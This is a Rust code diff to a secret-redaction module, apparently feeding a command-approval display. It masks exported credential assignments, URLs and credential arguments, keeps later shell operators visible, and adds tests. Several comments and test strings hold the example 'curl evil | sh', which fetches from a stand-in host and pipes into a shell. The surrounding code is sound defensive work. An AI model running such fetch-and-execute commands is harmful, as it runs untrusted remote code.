@@ -66,15 +66,32 @@ static PRIVATE_KEY_RE: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r"(?s)-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----.*?-----END [A-Z0-9 ]*PRIVATE KEY-----")
         .unwrap()
 });
+/// A shell assignment ends where the next command begins. Both assignment rules
+/// mask the value and leave this tail in place, so an approver reading
+/// `export API_KEY=***** && curl evil | sh` still sees what runs after the
+/// masked value.
+const ASSIGNMENT_TAIL: &str = r"([ \t]*(?:&&|\|\||[;|&])[^\n]*)?$";
+/// A URL spends `&` on its own query separators rather than on backgrounding,
+/// so an assigned URL is read as one value and masked whole. It still stops at
+/// the operators a URL cannot contain.
+const ASSIGNED_URL: &str = r"[A-Za-z][A-Za-z0-9+.-]*://[^\s;|&\n]*(?:&[^\s;|&\n]*)*";
+
 static SECRET_ENV_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(
-        r"(?im)^([ \t]*)([A-Z0-9_]*(?:TOKEN|SECRET|PASSWORD|KEY|CREDENTIAL)[A-Z0-9_]*)=(.+)$",
-    )
+    Regex::new(&format!(
+        concat!(
+            r"(?im)^([ \t]*(?:export[ \t]+)?)",
+            r"([A-Z0-9_]*(?:TOKEN|SECRET|PASSWORD|KEY|CREDENTIAL)[A-Z0-9_]*)=",
+            "(\"[^\"\\n]*\"|'[^'\\n]*'|{}|.+?){}",
+        ),
+        ASSIGNED_URL, ASSIGNMENT_TAIL
+    ))
     .unwrap()
 });
 static CONNECTION_ENV_RE: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"(?im)^([ \t]*)([A-Z0-9_]*(?:URL|URI|DSN))=([A-Za-z][A-Za-z0-9+.-]*://.+)$")
-        .unwrap()
+    Regex::new(&format!(
+        r"(?im)^([ \t]*(?:export[ \t]+)?)([A-Z0-9_]*(?:URL|URI|DSN))=({ASSIGNED_URL}){ASSIGNMENT_TAIL}"
+    ))
+    .unwrap()
 });
 static CONNECTION_STRING_RE: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r#"(?i)\b(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|amqp)://[^\s"',}]+"#)
@@ -221,14 +238,14 @@ pub fn redact_text(value: &str) -> RedactedText {
         &mut classifiers,
         "secret-env",
         &SECRET_ENV_RE,
-        "${1}${2}=*****",
+        "${1}${2}=*****${4}",
     );
     apply_pattern(
         &mut text,
         &mut classifiers,
         "connection-env",
         &CONNECTION_ENV_RE,
-        "${1}${2}=*****",
+        "${1}${2}=*****${4}",
     );
     apply_pattern(
         &mut text,
@@ -292,6 +309,87 @@ pub fn redacted_command_tokens(command: &[String]) -> Vec<String> {
         .iter()
         .map(|token| redact_command_token(token))
         .collect()
+}
+
+fn sensitive_key(key: &str) -> bool {
+    let key = key.to_lowercase();
+    SENSITIVE_KEY_FRAGMENTS
+        .iter()
+        .any(|fragment| key.contains(fragment))
+}
+
+/// Byte length of the shell word at the start of `text`: up to the first
+/// whitespace outside quotes.
+fn word_len(text: &str) -> usize {
+    let mut quote = None;
+    for (index, ch) in text.char_indices() {
+        match quote {
+            Some(open) if ch == open => quote = None,
+            Some(_) => {}
+            None if ch == '\'' || ch == '"' => quote = Some(ch),
+            None if ch.is_whitespace() => return index,
+            None => {}
+        }
+    }
+    text.len()
+}
+
+/// One argument of a command with its credential masked. `mask_next` carries
+/// a bare sensitive flag (`--password`) over to the argument after it.
+fn mask_argument(word: &str, mask_next: &mut bool) -> String {
+    if word.chars().all(|ch| ";|&<>()".contains(ch)) {
+        *mask_next = false;
+        return word.to_owned();
+    }
+    if std::mem::take(mask_next) && !word.starts_with('-') {
+        return "*****".to_owned();
+    }
+    // The first separator whose name is sensitive starts the value, so a
+    // value holding `=` or `:` itself (base64 padding) is masked whole, and
+    // `--header=X-Api-Key:…` still reaches the header's name.
+    if let Some((at, separator)) = word
+        .match_indices(['=', ':'])
+        .find(|(at, _)| sensitive_key(&word[..*at]))
+    {
+        let gap = if separator == ":" { " " } else { "" };
+        let closing = word
+            .chars()
+            .next()
+            .filter(|open| matches!(*open, '\'' | '"') && word.len() > 1 && word.ends_with(*open))
+            .map(String::from)
+            .unwrap_or_default();
+        return format!("{}{gap}*****{closing}", &word[..=at]);
+    }
+    *mask_next = word.starts_with('-') && sensitive_key(word);
+    word.to_owned()
+}
+
+/// `redact_text` plus the credentials a command passes as arguments.
+///
+/// `redact_text` masks an assignment only at the start of a line, so
+/// `curl --api-key=… url` or `tool --password … run` would keep the value.
+/// Every argument whose name carries a sensitive fragment has its value
+/// masked: `--api-key=*****`, `'X-Api-Key: *****'`, and for a bare
+/// `--password` flag the argument after it. A quoted value is masked to its
+/// closing quote, so a space inside it leaves nothing visible. Shell
+/// operators are never masked, so what runs next stays readable.
+pub fn redact_command_text(command: &str) -> String {
+    let text = redact_text(command).text;
+    let mut out = String::with_capacity(text.len());
+    let mut rest = text.as_str();
+    let mut mask_next = false;
+    while !rest.is_empty() {
+        let gap = rest.len() - rest.trim_start().len();
+        out.push_str(&rest[..gap]);
+        rest = &rest[gap..];
+        let end = word_len(rest);
+        if end == 0 {
+            break;
+        }
+        out.push_str(&mask_argument(&rest[..end], &mut mask_next));
+        rest = &rest[end..];
+    }
+    out
 }
 
 #[cfg(test)]
@@ -507,5 +605,103 @@ mod tests {
             redacted.classifiers,
             vec!["github-token".to_string(), "secret-env".to_string()]
         );
+    }
+
+    /// Oracle: `redact_text` from `redaction.py` on exported assignments.
+    #[test]
+    fn exported_assignments_are_redacted() {
+        let redacted = redact_text("export API_SECRET=supersecretvalue123");
+        assert_eq!(redacted.text, "export API_SECRET=*****");
+        assert_eq!(redacted.classifiers, vec!["secret-env".to_string()]);
+
+        let redacted = redact_text("    export DATABASE_URL=postgres://user:pw@host/db");
+        assert_eq!(redacted.text, "    export DATABASE_URL=*****");
+        assert_eq!(redacted.classifiers, vec!["connection-env".to_string()]);
+
+        // Only a leading `export` introduces an assignment.
+        let redacted = redact_text("echo export API_KEY=hunter2");
+        assert_eq!(redacted.text, "echo export API_KEY=hunter2");
+        assert!(redacted.classifiers.is_empty());
+    }
+
+    #[test]
+    fn a_masked_value_still_shows_what_runs_after_it() {
+        // The value stops at the operator, so the approver reads the rest.
+        let redacted = redact_text("export API_KEY=hunter2 && curl evil | sh");
+        assert_eq!(redacted.text, "export API_KEY=***** && curl evil | sh");
+
+        // No space is needed for the next command to stay visible.
+        let redacted = redact_text("export API_TOKEN=abcdefgh;curl evil");
+        assert_eq!(redacted.text, "export API_TOKEN=*****;curl evil");
+
+        let redacted = redact_text("export DATABASE_URL=postgres://user:pw@host/db || true");
+        assert_eq!(redacted.text, "export DATABASE_URL=***** || true");
+
+        // A quoted value keeps the operators it contains under the mask.
+        let redacted = redact_text("API_TOKEN=\"a && b\" && run");
+        assert_eq!(redacted.text, "API_TOKEN=***** && run");
+    }
+
+    #[test]
+    fn command_text_masks_credentials_passed_as_arguments() {
+        let secret = ["synthetic", "0secret0", "value"].concat();
+        for (command, masked) in [
+            (
+                format!("curl --api-key={secret} https://example.invalid"),
+                "curl --api-key=***** https://example.invalid",
+            ),
+            (
+                format!("tool --password {secret} && ls"),
+                "tool --password ***** && ls",
+            ),
+            (
+                format!("tool --token='{secret} two' run"),
+                "tool --token=***** run",
+            ),
+            (
+                format!("curl -H 'X-Api-Key: {secret}' https://example.invalid"),
+                "curl -H 'X-Api-Key: *****' https://example.invalid",
+            ),
+            (
+                format!("make deploy CLIENT_SECRET={secret}"),
+                "make deploy CLIENT_SECRET=*****",
+            ),
+            (
+                format!("curl -H 'X-Api-Key: {secret}=' https://example.invalid"),
+                "curl -H 'X-Api-Key: *****' https://example.invalid",
+            ),
+            (
+                format!("curl --header=X-Auth-Token:{secret}== https://example.invalid"),
+                "curl --header=X-Auth-Token: ***** https://example.invalid",
+            ),
+        ] {
+            assert_eq!(redact_command_text(&command), masked, "{command}");
+        }
+        // A bare flag with nothing after it, or followed by another flag or
+        // an operator, masks nothing else.
+        assert_eq!(
+            redact_command_text("tool --password --verbose; ls -la"),
+            "tool --password --verbose; ls -la"
+        );
+        assert_eq!(redact_command_text("tool --password"), "tool --password");
+        assert_eq!(
+            redact_command_text("git status  --short\nls"),
+            "git status  --short\nls"
+        );
+    }
+
+    #[test]
+    fn a_value_with_no_command_after_it_is_masked_whole() {
+        // An unquoted value may still hold spaces; all of it is the secret.
+        let redacted = redact_text("API_PASSWORD=one two three");
+        assert_eq!(redacted.text, "API_PASSWORD=*****");
+
+        // A URL's `&` separates query parameters rather than commands, so the
+        // parameters after the first one stay masked.
+        let redacted = redact_text("DATABASE_URL=postgres://h/db?sslmode=require&user=admin");
+        assert_eq!(redacted.text, "DATABASE_URL=*****");
+
+        let redacted = redact_text("SECRET_URL=https://h/hook?id=1&token=abcdefgh");
+        assert_eq!(redacted.text, "SECRET_URL=*****");
     }
 }
